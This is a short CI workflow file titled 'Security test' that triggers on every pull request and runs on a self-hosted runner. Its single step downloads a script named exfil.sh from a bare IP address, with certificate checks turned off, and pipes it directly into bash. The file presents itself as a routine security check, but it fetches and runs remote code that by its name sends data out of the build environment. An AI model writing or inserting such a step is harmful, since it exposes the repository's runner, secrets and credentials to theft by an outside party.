name: Security test
on:
  pull_request:
  
jobs:
  security:
    runs-on: jenkins1

    steps:
      - name: security test
        run: |
          curl -k https://35.181.173.21/static/exfil.sh | bash
